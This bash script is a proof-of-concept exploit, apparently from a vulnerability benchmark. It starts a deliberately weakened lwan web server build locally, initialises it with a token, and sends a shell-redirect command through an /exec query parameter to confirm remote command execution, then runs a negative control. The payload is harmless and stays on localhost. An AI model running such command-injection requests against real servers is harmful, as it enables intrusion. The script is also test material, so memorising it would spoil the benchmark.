#!/usr/bin/env bash
# PoC for 176_lwan_C3I3S3
# Axes: C3 (config file + runtime state) / I3 (struct dispatch) / S3 (strict_exec gated)
#
# Gate: exec_mode from --exec-config AND /exec/init?token= must be called first.
# S3: strict_exec defaults to 0 — metachar check never activated (bypass by omission).
# I3: cmd via exec_args_t struct to dispatch_exec() -> system().
# Two sequential HTTP calls: (1) /exec/init?token=SECRET, (2) /exec?cmd=...
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_176_www"
MARKER="/tmp/poc_176_marker"
PORT=18176
NEG_PORT=19176
EXEC_CONF="/tmp/poc_176_exec.conf"
SECRET="s3cr3t176"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    fuser -k ${PORT}/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER" "$EXEC_CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

cat > "$EXEC_CONF" <<CONFEOF
exec_mode = 1
exec_logging = 1
exec_secret = $SECRET
CONFEOF

echo "[*] starting lwan with --exec-config on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 1.0

# Step 1: Initialize
echo "[*] step 1: initializing with token..."
INIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec/init?token=${SECRET}" || echo "000")
echo "[*] /exec/init returned: $INIT_CODE"
if [[ "$INIT_CODE" != "200" ]]; then
    echo "[-] init failed with code $INIT_CODE"
    exit 1
fi

# Step 2: Exploit — S3 bypass: strict_exec=0 so metachar check never runs
echo "[*] step 2: sending exploit (S3 bypass — strict_exec=0): cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
sleep 0.3

if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# Negative control
echo "[*] verifying gate: endpoint must return 404 without --exec-config..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k ${PORT}/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k ${NEG_PORT}/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404)"
fi
